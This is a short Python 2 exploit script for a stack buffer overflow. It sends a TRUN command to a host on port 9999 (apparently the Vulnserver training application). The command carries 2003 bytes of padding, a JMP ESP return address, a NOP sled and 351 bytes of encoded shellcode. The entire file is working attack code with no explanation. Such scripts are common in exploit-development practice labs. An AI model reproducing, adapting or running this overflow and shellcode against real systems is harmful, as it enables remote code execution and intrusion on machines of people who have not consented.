#!/usr/bin/python 
import socket 
# total length = 4801 
# 77461EF2 jmp esp 
# badchar = "\x00"
shellcode = ("\xb8\x45\x1b\xc9\xcb\xd9\xea\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x83\xeb\xfc\x31\x43\x0e\x03\x06\x15\x2b\x3e\x74\xc1\x29"
"\xc1\x84\x12\x4e\x4b\x61\x23\x4e\x2f\xe2\x14\x7e\x3b\xa6\x98"
"\xf5\x69\x52\x2a\x7b\xa6\x55\x9b\x36\x90\x58\x1c\x6a\xe0\xfb"
"\x9e\x71\x35\xdb\x9f\xb9\x48\x1a\xe7\xa4\xa1\x4e\xb0\xa3\x14"
"\x7e\xb5\xfe\xa4\xf5\x85\xef\xac\xea\x5e\x11\x9c\xbd\xd5\x48"
"\x3e\x3c\x39\xe1\x77\x26\x5e\xcc\xce\xdd\x94\xba\xd0\x37\xe5"
"\x43\x7e\x76\xc9\xb1\x7e\xbf\xee\x29\xf5\xc9\x0c\xd7\x0e\x0e"
"\x6e\x03\x9a\x94\xc8\xc0\x3c\x70\xe8\x05\xda\xf3\xe6\xe2\xa8"
"\x5b\xeb\xf5\x7d\xd0\x17\x7d\x80\x36\x9e\xc5\xa7\x92\xfa\x9e"
"\xc6\x83\xa6\x71\xf6\xd3\x08\x2d\x52\x98\xa5\x3a\xef\xc3\xa1"
"\x8f\xc2\xfb\x31\x98\x55\x88\x03\x07\xce\x06\x28\xc0\xc8\xd1"
"\x4f\xfb\xad\x4d\xae\x04\xce\x44\x75\x50\x9e\xfe\x5c\xd9\x75"
"\xfe\x61\x0c\xd9\xae\xcd\xff\x9a\x1e\xae\xaf\x72\x74\x21\x8f"
"\x63\x77\xeb\xb8\x0e\x82\x7c\x07\x66\x8d\x70\xef\x75\x8d\x89"
"\x54\xf0\x6b\xe3\xba\x55\x24\x9c\x23\xfc\xbe\x3d\xab\x2a\xbb"
"\x7e\x27\xd9\x3c\x30\xc0\x94\x2e\xa5\x20\xe3\x0c\x60\x3e\xd9"
"\x38\xee\xad\x86\xb8\x79\xce\x10\xef\x2e\x20\x69\x65\xc3\x1b"
"\xc3\x9b\x1e\xfd\x2c\x1f\xc5\x3e\xb2\x9e\x88\x7b\x90\xb0\x54"
"\x83\x9c\xe4\x08\xd2\x4a\x52\xef\x8c\x3c\x0c\xb9\x63\x97\xd8"
"\x3c\x48\x28\x9e\x40\x85\xde\x7e\xf0\x70\xa7\x81\x3d\x15\x2f"
"\xfa\x23\x85\xd0\xd1\xe7\xb5\x9a\x7b\x41\x5e\x43\xee\xd3\x03"
"\x74\xc5\x10\x3a\xf7\xef\xe8\xb9\xe7\x9a\xed\x86\xaf\x77\x9c"
"\x97\x45\x77\x33\x97\x4f") # Payload size: 351 bytes   


evil = "A" * 2003 + "\xF2\x1E\x46\x77" +  "\x90" * 250 + shellcode 


print 'payload sent'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(('192.168.1.14', 9999))

s.send('TRUN /.:/' + evil + '\r\n')

s.recv(1024)

s.close()




























